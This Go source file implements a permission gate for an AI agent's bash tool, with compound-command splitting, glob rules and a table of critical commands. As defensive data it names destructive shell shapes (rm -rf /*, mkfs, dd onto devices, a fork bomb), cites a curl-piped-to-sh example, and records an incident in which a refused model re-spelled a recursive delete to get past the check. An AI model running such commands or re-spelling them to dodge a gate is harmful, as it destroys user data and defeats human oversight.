package approval

import (
	"encoding/json"
	"strings"
)

// ── the bash matching law ───────────────────────────────────────────────────
//
// Bash is the only tool whose arguments are a language, and a command line can
// carry several commands at once. That makes matching ASYMMETRIC, and the
// asymmetry is the whole safety argument of this package:
//
//	deny / prompt  fire when the glob matches the WHOLE line OR ANY SINGLE
//	               SEGMENT of a compound one. A deny rule of "rm -rf *" must
//	               still catch "cd /tmp && rm -rf build", because a dangerous
//	               fragment is dangerous wherever it is standing.
//
//	allow          fires only when the glob matches the ENTIRE line, and NEVER
//	               on a compound line at all. "git status*" allowed says
//	               nothing about "git status && curl evil.sh | sh". A narrow
//	               allow cannot vouch for a command it has not seen; the rest
//	               of the line was never approved by anybody.
//
// Read the two halves together: a permission is a statement about exactly one
// command, a prohibition is a statement about a shape that may appear anywhere.
// Anything else lets an allow launder a compound line past its own rules.
func ruleMatches(rule Rule, whole string, segments []string, compound bool) bool {
	if !rule.Action.valid() {
		// A hand-built Policy with a garbage action: skip it rather than act on
		// a word this package does not understand.
		return false
	}
	if rule.Action == ActionAllow {
		if compound {
			return false
		}
		return globMatch(rule.Match, whole)
	}
	if globMatch(rule.Match, whole) {
		return true
	}
	for _, segment := range segments {
		if globMatch(rule.Match, segment) {
			return true
		}
	}
	return false
}

// MatchRule reports the first pattern that answers one command line, and
// whether any of them did. It is [Policy.CheckBash] without the answer: a
// caller ABOUT TO WRITE a rule needs to know what the list already says, and
// the only correct way to ask that is the matcher the policy itself uses.
//
// internal/config's approval memory is that caller (approvalmemory.go): a
// command the list already allows must not be written twice, and one it already
// denies must not be overwritten by a keystroke on a consent card.
func (p Policy) MatchRule(command string) (Rule, bool) {
	segments, compound := splitSegments(command)
	return matchRule(p.BashPatterns, strings.TrimSpace(command), segments, compound)
}

// OutsideRule names the closest saved bash rule that does not cover this call.
// The longest same-program pattern wins; equal lengths keep settings order.
// This is explanation only and never changes the gate's answer.
func (p Policy) OutsideRule(tool string, args []byte) string {
	if tool != ToolBash {
		return ""
	}
	var call struct {
		Command string `json:"command"`
	}
	if json.Unmarshal(args, &call) != nil {
		return ""
	}
	words := strings.Fields(call.Command)
	if len(words) == 0 {
		return ""
	}
	segments, compound := splitSegments(call.Command)
	closest := ""
	for _, rule := range p.BashPatterns {
		pattern := strings.Fields(rule.Match)
		if len(pattern) == 0 || pattern[0] != words[0] || !rule.Action.valid() || ruleMatches(rule, strings.TrimSpace(call.Command), segments, compound) {
			continue
		}
		if len(rule.Match) > len(closest) {
			closest = rule.Match
		}
	}
	return closest
}

// matchRule is the first-match-wins walk, shared by the decision path and by
// MatchRule so that "what does the list say about this line" has exactly one
// answer in this package.
func matchRule(rules []Rule, whole string, segments []string, compound bool) (Rule, bool) {
	for _, rule := range rules {
		if ruleMatches(rule, whole, segments, compound) {
			return rule, true
		}
	}
	return Rule{}, false
}

// Vouchable reports whether an allow rule could EVER fire for this command
// line. It is the matching law's allow half, asked in advance.
//
// A compound line is not vouchable at any pattern: an allow speaks for one
// command it matches whole, and nothing written down can make it speak for
// `cd /tmp && rm -rf build`. A caller that persists an approval asks this first,
// because writing a rule that cannot fire would put a line in somebody's
// settings claiming an approval that does nothing.
func Vouchable(command string) bool {
	command = strings.TrimSpace(command)
	if command == "" {
		return false
	}
	_, compound := splitSegments(command)
	return !compound
}

// ── segments ────────────────────────────────────────────────────────────────

// BashCommandPart is one command and the shell boundary that follows it. The
// command is trimmed, while Separator preserves the operator bytes themselves.
//
// THE SPANS ARE WHAT LETS A READER DRAW PART OF A COMMAND WITHOUT RETYPING IT.
// Command[Start:End] of the line that was split is this part as it was typed,
// the space around it included, and [End:SepEnd] is the boundary after it. A
// reader that wants some parts and not others cuts spans out of the line it
// was handed; one that joins trimmed commands back together has written a
// different line from the one that ran.
type BashCommandPart struct {
	Command   string
	Separator string
	Start     int
	End       int
	SepEnd    int
}

// SplitBashCommand breaks a command line at the boundaries the shell acts on.
// Quoted and escaped bytes remain in their command, and redirection ampersands
// are not mistaken for command boundaries.
func SplitBashCommand(command string) []BashCommandPart {
	parts, _ := splitBashCommand(command)
	return parts
}

// splitSegments breaks a command line into the individual commands it runs and
// reports whether it was compound at all.
//
// Separators: && || ; | a single & subshells ($( ), backticks, parentheses)
// and newlines. Quoted text is literal — a ';' inside quotes is an argument,
// not a separator — because splitting inside a quoted string invents segments
// that never run.
//
// compound is tracked separately from len(segments) because a trailing
// backgrounding '&' leaves one segment behind and still means the line is not
// the single simple command an allow rule is entitled to vouch for.
//
// Two deliberate omissions: brace groups '{ }' are not separators (the ';'
// inside one already is, and treating '{' as a break would shred brace
// expansion), and a '&' that belongs to a redirection — '2>&1', '&>log' — is
// left alone, since splitting there would make every command with a redirect
// look compound.
func splitSegments(command string) (segments []string, compound bool) {
	parts, compound := splitBashCommand(command)
	segments = make([]string, 0, len(parts))
	for _, part := range parts {
		segments = append(segments, part.Command)
	}
	return segments, compound
}

func splitBashCommand(command string) (parts []BashCommandPart, compound bool) {
	var current []byte
	var quote byte
	begin := 0
	// flush ends the part being read at a boundary whose last byte is just
	// before sepEnd. A stretch with nothing in it makes no part, and the next
	// part still begins after the boundary that closed it.
	flush := func(separator string, sepEnd int) {
		if text := strings.TrimSpace(string(current)); text != "" {
			parts = append(parts, BashCommandPart{
				Command: text, Separator: separator,
				Start: begin, End: sepEnd - len(separator), SepEnd: sepEnd,
			})
		}
		begin = sepEnd
		current = current[:0]
	}
	for index := 0; index < len(command); index++ {
		char := command[index]
		if quote != 0 {
			if char == '\\' && quote == '"' && index+1 < len(command) {
				current = append(current, char, command[index+1])
				index++
				continue
			}
			current = append(current, char)
			if char == quote {
				quote = 0
			}
			continue
		}
		switch {
		case char == '\\' && index+1 < len(command):
			current = append(current, char, command[index+1])
			index++
		case char == '\'' || char == '"':
			quote = char
			current = append(current, char)
		case char == '\n' || char == ';':
			compound = true
			flush(string(char), index+1)
		case char == '&':
			if (index+1 < len(command) && command[index+1] == '>') || lastNonSpace(current) == '>' {
				current = append(current, char)
				continue
			}
			separator := "&"
			if index+1 < len(command) && command[index+1] == '&' {
				separator = "&&"
				index++
			}
			compound = true
			flush(separator, index+1)
		case char == '|':
			separator := "|"
			if index+1 < len(command) && command[index+1] == '|' {
				separator = "||"
				index++
			}
			compound = true
			flush(separator, index+1)
		case char == '$' && index+1 < len(command) && command[index+1] == '(':
			index++
			compound = true
			flush("$(", index+1)
		case char == '(' || char == ')' || char == '`':
			compound = true
			flush(string(char), index+1)
		default:
			current = append(current, char)
		}
	}
	flush("", len(command))
	return parts, compound
}

func lastNonSpace(text []byte) byte {
	for index := len(text) - 1; index >= 0; index-- {
		if text[index] != ' ' && text[index] != '\t' {
			return text[index]
		}
	}
	return 0
}

// ── glob ────────────────────────────────────────────────────────────────────

// globMatch is filepath.Match-style matching with '*' as the only metacharacter
// — everything else, including '?', '[' and '\', is a literal — and it is
// case-sensitive, because shells are.
//
// It is written out rather than delegated to path/filepath because that
// package's '*' stops at a path separator: filepath.Match("rm -rf *",
// "rm -rf /var/log") is FALSE on Linux, which would quietly hole every deny
// rule anyone writes about an absolute path. Here '*' spans anything.
func globMatch(pattern, text string) bool {
	var (
		patternIndex, textIndex int
		star                    = -1
		resume                  int
	)
	for textIndex < len(text) {
		if patternIndex < len(pattern) && pattern[patternIndex] == '*' {
			star = patternIndex
			resume = textIndex
			patternIndex++
			continue
		}
		if patternIndex < len(pattern) && pattern[patternIndex] == text[textIndex] {
			patternIndex++
			textIndex++
			continue
		}
		if star < 0 {
			return false
		}
		// Backtrack: let the last '*' swallow one more byte and retry.
		patternIndex = star + 1
		resume++
		textIndex = resume
	}
	for patternIndex < len(pattern) && pattern[patternIndex] == '*' {
		patternIndex++
	}
	return patternIndex == len(pattern)
}

// ── critical commands ───────────────────────────────────────────────────────

// criticalCommands is the prompt table that a blanket allow cannot switch off.
// CheckBash refuses protected deletions before it consults this table.
//
// It is deliberately short and unglamorous. It is not a sandbox, not a threat
// model, and not an attempt to enumerate every way a shell can ruin a machine
// — that list does not terminate, and pretending otherwise would sell a
// guarantee this package cannot keep. It is a floor: the handful of shapes
// that destroy a disk or drop the box, where being asked once costs a keystroke
// and not being asked costs the machine. Everything else is the policy's job.
//
// Matched against the whole line and each segment, after normalizeCritical.
var criticalCommands = []string{
	// Keep the rule spellings for existing absolute-path prompts, including
	// the broad '/*' glob that matches a descendant such as /var/tmp/x.
	"rm -rf /*",
	"rm -fr /*",
	// Making a filesystem — mkfs, mkfs.ext4, mkfs.xfs …
	"mkfs*",
	// dd with a device as its output.
	"dd *of=/dev/*",
	// Any redirection onto a raw disk. normalizeCritical closes the gap after
	// '>' so "> /dev/sda" and ">/dev/sda" are the same string here.
	"*>/dev/sd*",
	// Dropping the machine out from under the session.
	"shutdown", "shutdown *",
	"reboot", "reboot *",
	"halt", "halt *",
	"poweroff", "poweroff *",
}

// forkBomb is the classic shape, matched against the line with ALL whitespace
// removed so the usual spacings — ":(){ :|:& };:" and ":(){:|:&};:" — are one
// string. Renaming the function defeats it; that is fine. The table is a floor.
const forkBomb = "*:(){:|:&};:*"

// criticalHit reports the first critical shape found in the line, and the
// table entry that found it, for display.
func criticalHit(command string, segments []string) (string, bool) {
	if globMatch(forkBomb, stripSpace(command)) {
		return ":(){:|:&};:", true
	}
	// THE PERSON'S NO HOLDS FOR THE ACT, NOT FOR ONE SPELLING OF IT. The table
	// below matches text, and every `rm` entry in it spells `rm -rf /`, so a
	// model refused that line ran `rm -r /tmp/victim` one call later and was
	// never asked (#2813). The table still answers first, so a line it already
	// catches keeps the rule it has always been reported under. Only what it
	// misses is then read the way the shell reads it —
	// quotes stripped, flags in any spelling, a path-qualified `rm`.
	candidates := make([]string, 0, len(segments)+1)
	candidates = append(candidates, command)
	candidates = append(candidates, segments...)
	for _, candidate := range candidates {
		normalized := normalizeCritical(candidate)
		if normalized == "" {
			continue
		}
		for _, pattern := range criticalCommands {
			if globMatch(pattern, normalized) {
				return pattern, true
			}
		}
	}
	return recursiveRemoveHit(command)
}

// normalizeCritical flattens the spellings that would otherwise let a critical
// command past on a technicality: runs of whitespace collapse to one space, the
// gap after a '>' closes, and a leading sudo/doas is dropped so "sudo reboot"
// reads as "reboot". The policy patterns get no such treatment — those are the
// author's own strings and are matched as written.
func normalizeCritical(command string) string {
	normalized := strings.Join(strings.Fields(command), " ")
	for strings.Contains(normalized, "> ") {
		normalized = strings.ReplaceAll(normalized, "> ", ">")
	}
	for {
		word, rest, _ := strings.Cut(normalized, " ")
		if word != "sudo" && word != "doas" {
			return normalized
		}
		normalized = strings.TrimSpace(rest)
	}
}

// The two names a recursive delete is reported under. They are the table's
// own spellings, so the rule a person reads on the card is a line they can find
// in the manual: an absolute or home path is the `rm -rf /*` they were already
// asked about, and a bare `*` is the `rm -rf *` the manual has always promised.
const (
	criticalRemoveRoot = "rm -rf /*"
	criticalRemoveAll  = "rm -rf *"
)

// recursiveRemoveHit reports a recursive `rm` aimed at a target whose loss
// cannot be taken back: an absolute path, the home folder (`~`, `$HOME`,
// `${HOME}`), or a bare `*` that empties the folder it runs in.
//
// IT GRADES THE ACT AND NOT THE FLAGS. `-r`, `-R` and `--recursive` are one
// flag, clustered (`-rf`, `-fR`) or split (`-r -f`), with or without `-f`, and
// after `--` every word is a target. The words come from [CommandWords], so a
// quoted path is the path, and a leading `sudo`, `env` or `/bin/rm` reads as the
// `rm` it runs ([unwrap], [commandBase]).
//
// A RELATIVE TARGET IS NOT GRADED. `rm -rf build` and `rm -r ./tmp/x` are the
// ordinary cleanup of a project, and a floor that asked about them would be
// pressed through without reading. The earlier protected-delete check also
// covers `find -delete` starting at a protected path.
func recursiveRemoveHit(command string) (string, bool) {
	for _, words := range CommandWords(command) {
		words = unwrap(words, map[string]string{}, CredentialScope{})
		if len(words) == 0 || commandBase(words[0]) != "rm" {
			continue
		}
		recursive, _, targets := removeArguments(words[1:])
		if !recursive {
			continue
		}
		for _, target := range targets {
			if hit := removeTargetHit(target); hit != "" {
				return hit, true
			}
		}
	}
	return "", false
}

// removeArguments reads options and operands together because rm accepts flags
// after targets until the option terminator.
func removeArguments(words []string) (recursive, noPreserveRoot bool, targets []string) {
	options := true
	for _, word := range words {
		switch {
		case !options:
			targets = append(targets, word)
		case word == "--":
			options = false
		case word == "--no-preserve-root":
			noPreserveRoot = true
		case len(word) > 2 && strings.HasPrefix("--recursive", word):
			// GNU rm accepts unambiguous long-option prefixes.
			recursive = true
		case strings.HasPrefix(word, "--"):
		case strings.HasPrefix(word, "-") && len(word) > 1:
			recursive = recursive || strings.ContainsAny(word[1:], "rR")
		default:
			targets = append(targets, word)
		}
	}
	return recursive, noPreserveRoot, targets
}

// removeTargetHit names the table entry one delete target falls under, or ""
// for a target this floor leaves to the policy.
func removeTargetHit(target string) string {
	switch {
	case target == "*":
		return criticalRemoveAll
	case strings.HasPrefix(target, "/"),
		target == "~", strings.HasPrefix(target, "~/"),
		target == "$HOME", strings.HasPrefix(target, "$HOME/"),
		target == "${HOME}", strings.HasPrefix(target, "${HOME}/"):
		return criticalRemoveRoot
	}
	return ""
}

func stripSpace(text string) string {
	return strings.Join(strings.Fields(text), "")
}
